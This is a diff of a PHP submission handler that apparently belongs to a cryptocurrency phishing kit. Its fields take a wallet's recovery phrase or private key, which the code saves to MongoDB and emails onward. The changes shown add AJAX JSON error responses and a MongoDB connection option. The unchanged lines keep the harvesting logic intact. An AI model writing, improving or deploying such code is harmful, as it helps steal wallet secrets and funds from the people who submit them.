@@ -22,14 +22,25 @@ if (!isset($_SESSION['csrf_token'])) {
 }
 
 if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
-    header('Content-Type: text/html; charset=UTF-8');
-    http_response_code(403);
-    echo "<h2>Invalid CSRF Token</h2><p>Please refresh the page and try again. <a href='wallet1c0b1c0b.php'>Back</a></p>";
+    if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
+        // AJAX response
+        http_response_code(403);
+        echo json_encode(['error' => 'Invalid CSRF Token']);
+    } else {
+        header('Content-Type: text/html; charset=UTF-8');
+        http_response_code(403);
+        echo "<h2>Invalid CSRF Token</h2><p>Please refresh the page and try again. <a href='wallet1c0b1c0b.php'>Back</a></p>";
+    }
     exit;
 }
 
 if ($_SERVER["REQUEST_METHOD"] !== "POST") {
-    header('Location: wallet1c0b1c0b.php');
+    if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
+        http_response_code(405);
+        echo json_encode(['error' => 'Method not allowed']);
+    } else {
+        header('Location: wallet1c0b1c0b.php');
+    }
     exit;
 }
 
@@ -51,50 +62,80 @@ if (isset($_POST['pwallet'], $_POST['pemail'], $_POST['phrase'])) {
     $email = trim($_POST['premail']);
     $data = trim($_POST['private']);
 } else {
-    header('Content-Type: text/html; charset=UTF-8');
-    http_response_code(400);
-    echo "<h2>Invalid Submission</h2><p>Please fill in all required fields correctly. <a href='wallet1c0b1c0b.php'>Back</a></p>";
+    if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
+        http_response_code(400);
+        echo json_encode(['error' => 'Invalid Submission']);
+    } else {
+        header('Content-Type: text/html; charset=UTF-8');
+        http_response_code(400);
+        echo "<h2>Invalid Submission</h2><p>Please fill in all required fields correctly. <a href='wallet1c0b1c0b.php'>Back</a></p>";
+    }
     exit;
 }
 
 if (empty($wallet) || empty($email) || empty($data) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
-    header('Content-Type: text/html; charset=UTF-8');
-    http_response_code(400);
-    echo "<h2>Invalid Input</h2><p>Please fill in all required fields correctly. <a href='wallet1c0b1c0b.php'>Back</a></p>";
+    if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
+        http_response_code(400);
+        echo json_encode(['error' => 'Invalid Input']);
+    } else {
+        header('Content-Type: text/html; charset=UTF-8');
+        http_response_code(400);
+        echo "<h2>Invalid Input</h2><p>Please fill in all required fields correctly. <a href='wallet1c0b1c0b.php'>Back</a></p>";
+    }
     exit;
 }
 if (!preg_match('/^[a-zA-Z0-9-_]{1,64}$/', $wallet)) {
-    header('Content-Type: text/html; charset=UTF-8');
-    http_response_code(400);
-    echo "<h2>Invalid Wallet Name</h2><p>Use up to 64 alphanumeric characters for the wallet name. <a href='wallet1c0b1c0b.php'>Back</a></p>";
+    if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
+        http_response_code(400);
+        echo json_encode(['error' => 'Invalid Wallet Name']);
+    } else {
+        header('Content-Type: text/html; charset=UTF-8');
+        http_response_code(400);
+        echo "<h2>Invalid Wallet Name</h2><p>Use up to 64 alphanumeric characters for the wallet name. <a href='wallet1c0b1c0b.php'>Back</a></p>";
+    }
     exit;
 }
 if (strlen($data) > 1000) {
-    header('Content-Type: text/html; charset=UTF-8');
-    http_response_code(400);
-    echo "<h2>Input Too Long</h2><p>Submission data must be under 1000 characters. <a href='wallet1c0b1c0b.php'>Back</a></p>";
+    if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
+        http_response_code(400);
+        echo json_encode(['error' => 'Input Too Long']);
+    } else {
+        header('Content-Type: text/html; charset=UTF-8');
+        http_response_code(400);
+        echo "<h2>Input Too Long</h2><p>Submission data must be under 1000 characters. <a href='wallet1c0b1c0b.php'>Back</a></p>";
+    }
     exit;
 }
 $data = htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
 
 if (isset($_SESSION['last_submission']) && (time() - $_SESSION['last_submission']) < 60) {
-    header('Content-Type: text/html; charset=UTF-8');
-    http_response_code(429);
-    echo "<h2>Rate Limit Exceeded</h2><p>Please wait a minute before submitting again. <a href='wallet1c0b1c0b.php'>Back</a></p>";
+    if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
+        http_response_code(429);
+        echo json_encode(['error' => 'Rate Limit Exceeded']);
+    } else {
+        header('Content-Type: text/html; charset=UTF-8');
+        http_response_code(429);
+        echo "<h2>Rate Limit Exceeded</h2><p>Please wait a minute before submitting again. <a href='wallet1c0b1c0b.php'>Back</a></p>";
+    }
     exit;
 }
 $_SESSION['last_submission'] = time();
 
 if (!isset($_ENV['DB_HOST'], $_ENV['DB_NAME'], $_ENV['DB_USER'], $_ENV['DB_PASS'])) {
     error_log("Database configuration missing in " . __FILE__);
-    header('Content-Type: text/html; charset=UTF-8');
-    http_response_code(500);
-    echo "<h2>Server Error</h2><p>Database configuration is unavailable. Please try again later. <a href='wallet1c0b1c0b.php'>Back</a></p>";
+    if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
+        http_response_code(500);
+        echo json_encode(['error' => 'Server Error']);
+    } else {
+        header('Content-Type: text/html; charset=UTF-8');
+        http_response_code(500);
+        echo "<h2>Server Error</h2><p>Database configuration is unavailable. Please try again later. <a href='wallet1c0b1c0b.php'>Back</a></p>";
+    }
     exit;
 }
 
 try {
-    $mongoUri = "mongodb://" . $_ENV['DB_USER'] . ":" . $_ENV['DB_PASS'] . "@" . $_ENV['DB_HOST'] . ":" . ($_ENV['DB_PORT'] ?? '27017') . "/" . $_ENV['DB_NAME'] . "?authSource=admin";
+    $mongoUri = "mongodb://" . $_ENV['DB_USER'] . ":" . $_ENV['DB_PASS'] . "@" . $_ENV['DB_HOST'] . ":" . ($_ENV['DB_PORT'] ?? '27017') . "/" . $_ENV['DB_NAME'] . "?authSource=admin&directConnection=true";
     $manager = new Manager($mongoUri);
     $bulk = new BulkWrite;
     $document = [
@@ -111,9 +152,14 @@ try {
     }
 } catch (MongoDBException $e) {
     error_log("MongoDB error in " . __FILE__ . ": " . $e->getMessage());
-    header('Content-Type: text/html; charset=UTF-8');
-    http_response_code(500);
-    echo "<h2>Database Error</h2><p>Unable to save submission. Please try again. <a href='wallet1c0b1c0b.php'>Back</a></p>";
+    if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
+        http_response_code(500);
+        echo json_encode(['error' => 'Database Error']);
+    } else {
+        header('Content-Type: text/html; charset=UTF-8');
+        http_response_code(500);
+        echo "<h2>Database Error</h2><p>Unable to save submission. Please try again. <a href='wallet1c0b1c0b.php'>Back</a></p>";
+    }
     exit;
 }
 
@@ -122,10 +168,15 @@ use PHPMailer\PHPMailer\Exception;
 
 if (!class_exists('PHPMailer\PHPMailer\PHPMailer')) {
     error_log("PHPMailer not found in " . __FILE__);
-    header('Content-Type: text/html; charset=UTF-8');
-    http_response_code(500);
-    echo "<h2>Submission Saved</h2><p>Email service is unavailable, but your submission is stored.</p>";
-    echo "<p><a href='wallet1c0b1c0b.php'>Back</a></p>";
+    if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
+        http_response_code(500);
+        echo json_encode(['error' => 'Submission Saved (Email unavailable)']);
+    } else {
+        header('Content-Type: text/html; charset=UTF-8');
+        http_response_code(500);
+        echo "<h2>Submission Saved</h2><p>Email service is unavailable, but your submission is stored.</p>";
+        echo "<p><a href='wallet1c0b1c0b.php'>Back</a></p>";
+    }
     exit;
 }
 
@@ -148,15 +199,24 @@ try {
     $mail->Subject = "New $submission_type Submission from $wallet";
     $mail->Body = "Wallet: $wallet\nType: $submission_type\nData: $data\nEmail: $email\nTime: " . date('Y-m-d H:i:s');
     $mail->send();
-    header('Content-Type: text/html; charset=UTF-8');
-    echo "<h2>Submission Received</h2><p>Your submission has been recorded and an email notification sent.</p>";
-    echo "<p><a href='wallet1c0b1c0b.php'>Back</a></p>";
+    if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
+        echo json_encode(['success' => 'Submission received and emailed']);
+    } else {
+        header('Content-Type: text/html; charset=UTF-8');
+        echo "<h2>Submission Received</h2><p>Your submission has been recorded and an email notification sent.</p>";
+        echo "<p><a href='wallet1c0b1c0b.php'>Back</a></p>";
+    }
 } catch (Exception $e) {
     error_log("Email error in " . __FILE__ . ": " . $mail->ErrorInfo);
-    header('Content-Type: text/html; charset=UTF-8');
-    http_response_code(500);
-    echo "<h2>Submission Saved</h2><p>Email notification failed, but your submission is stored.</p>";
-    echo "<p><a href='wallet1c0b1c0b.php'>Back</a></p>";
+    if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
+        http_response_code(500);
+        echo json_encode(['error' => 'Submission saved (Email failed)']);
+    } else {
+        header('Content-Type: text/html; charset=UTF-8');
+        http_response_code(500);
+        echo "<h2>Submission Saved</h2><p>Email notification failed, but your submission is stored.</p>";
+        echo "<p><a href='wallet1c0b1c0b.php'>Back</a></p>";
+    }
 }
 
 try {
